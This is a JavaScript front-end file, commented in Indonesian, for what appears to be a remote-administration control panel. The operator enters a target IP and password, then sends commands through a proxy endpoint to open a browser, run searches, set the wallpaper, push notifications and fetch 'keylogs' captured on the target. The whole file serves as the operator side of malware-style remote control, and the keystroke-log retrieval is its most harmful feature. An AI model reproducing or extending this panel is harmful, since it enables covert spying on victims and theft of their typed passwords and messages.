document.addEventListener('DOMContentLoaded', function() {
    const targetIp = document.getElementById('targetIp');
    const password = document.getElementById('password');
    const connectBtn = document.getElementById('connectBtn');
    const connectionStatus = document.getElementById('connectionStatus');
    
    const urlInput = document.getElementById('urlInput');
    const openBrowserBtn = document.getElementById('openBrowserBtn');
    
    const searchInput = document.getElementById('searchInput');
    const searchBtn = document.getElementById('searchBtn');
    
    const wallpaperUrl = document.getElementById('wallpaperUrl');
    const setWallpaperBtn = document.getElementById('setWallpaperBtn');
    
    const notifTitle = document.getElementById('notifTitle');
    const notifMessage = document.getElementById('notifMessage');
    const sendNotifBtn = document.getElementById('sendNotifBtn');
    
    const getLogsBtn = document.getElementById('getLogsBtn');
    const logsOutput = document.getElementById('logsOutput');
    const clearLogsBtn = document.getElementById('clearLogsBtn');
    
    let isConnected = false;
    let currentTarget = '';
    
    // Fungsi untuk mengupdate status koneksi
    function updateConnectionStatus(connected) {
        isConnected = connected;
        if (connected) {
            connectionStatus.textContent = 'Status: Connected';
            connectionStatus.className = 'status-connected';
        } else {
            connectionStatus.textContent = 'Status: Disconnected';
            connectionStatus.className = 'status-disconnected';
        }
    }
    
    // Fungsi untuk mengirim perintah ke server
    async function sendCommand(command, data = {}) {
        if (!isConnected) {
            alert('Please connect first!');
            return { status: 'error', message: 'Not connected' };
        }
        
        try {
            const payload = {
                ...data,
                command,
                password: password.value
            };
            
            const response = await fetch(`/api/proxy`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    target: currentTarget,
                    payload
                })
            });
            
            return await response.json();
        } catch (error) {
            console.error('Error:', error);
            return { status: 'error', message: error.message };
        }
    }
    
    // Event listeners
    connectBtn.addEventListener('click', async function() {
        if (!targetIp.value) {
            alert('Please enter target IP and port');
            return;
        }
        
        if (!password.value) {
            alert('Please enter password');
            return;
        }
        
        currentTarget = targetIp.value;
        
        try {
            const result = await sendCommand('ping');
            if (result.status === 'success') {
                updateConnectionStatus(true);
                alert('Connected successfully!');
            } else {
                updateConnectionStatus(false);
                alert('Connection failed: ' + (result.message || 'Unknown error'));
            }
        } catch (error) {
            updateConnectionStatus(false);
            alert('Connection error: ' + error.message);
        }
    });
    
    openBrowserBtn.addEventListener('click', async function() {
        const url = urlInput.value || 'https://google.com';
        const result = await sendCommand('open_browser', { url });
        alert(result.message);
    });
    
    searchBtn.addEventListener('click', async function() {
        const query = searchInput.value;
        if (!query) {
            alert('Please enter search query');
            return;
        }
        const result = await sendCommand('search', { query });
        alert(result.message);
    });
    
    setWallpaperBtn.addEventListener('click', async function() {
        const imageUrl = wallpaperUrl.value;
        if (!imageUrl) {
            alert('Please enter image URL');
            return;
        }
        const result = await sendCommand('set_wallpaper', { image_url: imageUrl });
        alert(result.message);
    });
    
    sendNotifBtn.addEventListener('click', async function() {
        const title = notifTitle.value || 'Notification';
        const message = notifMessage.value || '';
        
        if (!message) {
            alert('Please enter notification message');
            return;
        }
        
        const result = await sendCommand('send_notification', { 
            title, 
            message 
        });
        alert(result.message);
    });
    
    getLogsBtn.addEventListener('click', async function() {
        const result = await sendCommand('get_keylogs');
        if (result.status === 'success') {
            logsOutput.value = result.logs || 'No logs available';
        } else {
            alert('Error getting logs: ' + result.message);
        }
    });
    
    clearLogsBtn.addEventListener('click', function() {
        logsOutput.value = '';
    });
});
